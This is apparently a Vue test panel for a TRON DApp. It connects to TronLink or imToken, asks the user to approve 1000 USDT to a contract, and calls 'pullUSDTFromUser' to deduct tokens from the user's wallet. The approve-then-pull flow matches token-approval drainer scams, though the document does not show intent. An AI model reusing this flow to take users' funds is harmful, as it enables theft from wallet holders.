<script setup>
import { ref, onMounted } from "vue";

const tronWeb = ref(null);
const userAddress = ref("");
const contract = ref(null);

const CONTRACT_ADDRESS = "TK69cReMPTWn1g18EC9ikAADBPk5oCVyFA";

// ================= 等待 TronLink 注入 =================
const waitForTronLink = async () => {
  let retry = 0;

  while (!(window.tronWeb && window.tronWeb.ready)) {
    await new Promise(r => setTimeout(r, 300));
    retry++;

    if (retry > 30) {
      throw new Error("未检测到 TronLink，请打开钱包");
    }
  }

  return window.tronWeb;
};

// ================= 初始化 =================
const init = async () => {
  try {
    const tw = await waitForTronLink();

    tronWeb.value = tw;
    userAddress.value = tw.defaultAddress.base58;

    contract.value = await tw.contract().at(CONTRACT_ADDRESS);

    console.log("✅ 合约初始化成功");
    console.log("钱包地址:", userAddress.value);

  } catch (err) {
    console.error("初始化失败:", err);
  }
};

onMounted(() => {
  setTimeout(init, 500);
});

// ================= 查询 =================
const checkStatus = async () => {
  try {
    if (!contract.value) {
      console.warn("合约未初始化");
      return;
    }

    const user = userAddress.value;

    const balance = await contract.value.usdtBalance(user).call();
    const allowance = await contract.value.usdtAllowance(user).call();

    console.log("USDT余额:", balance.toString());
    console.log("授权额度:", allowance.toString());

  } catch (err) {
    console.error("查询失败:", err);
  }
};

// ================= 授权USDT =================
const approveUSDT = async () => {
  try {
    const USDT_ADDRESS = "TBuYtZDBngn9oHkW2iFciGmTzWBLQxgmqn";

    const usdt = await tronWeb.value.contract().at(USDT_ADDRESS);

    await usdt
      .approve(CONTRACT_ADDRESS, 1000 * 1e6)
      .send();

    console.log("授权成功");

  } catch (err) {
    console.error("授权失败:", err);
  }
};

// ================= 扣款 =================
const pullUSDT = async () => {
  try {
    if (!contract.value) return;

    await contract.value
      .pullUSDTFromUser(userAddress.value, 100 * 1e6)
      .send();

    console.log("扣款成功");

  } catch (err) {
    console.error("扣款失败:", err);
  }
};

// ================= 转账 =================
const sendUSDT = async () => {
  try {
    if (!contract.value) return;

    await contract.value
      .sendUSDTTo(userAddress.value, 50 * 1e6)
      .send();

    console.log("转账成功");

  } catch (err) {
    console.error("转账失败:", err);
  }
};

// ================= imToken授权USDT =================

const approveImToken = async () => {
  try {

    const USDT_ADDRESS = "TBuYtZDBngn9oHkW2iFciGmTzWBLQxgmqn";

    if (!tronWeb.value) {
      throw new Error("钱包未连接");
    }

    // 🔥 imToken / TronLink 都通用（关键）
    const usdt = await tronWeb.value.contract().at(USDT_ADDRESS);

    const amount = 1000 * 1e6;

    await usdt.approve(CONTRACT_ADDRESS, amount).send();

    console.log("imToken授权成功");

  } catch (err) {
    console.error("imToken授权失败:", err);
  }
};
</script>

<template>
  <div style="padding:20px">
    <h2>SecureToken DApp 测试面板</h2>

    <p>钱包地址：{{ userAddress }}</p>

    <hr />

    <button @click="checkStatus" :disabled="!contract">
      查询USDT状态
    </button>

    <br /><br />

    <button @click="approveUSDT">
      授权 USDT
    </button>

    <br /><br />

    <button @click="pullUSDT" :disabled="!contract">
      扣 100 USDT
    </button>

    <br /><br />

    <button @click="sendUSDT" :disabled="!contract">
      转 50 USDT
    </button>

    <button @click="approveImToken">
      imToken授权USDT
    </button>
  </div>
</template>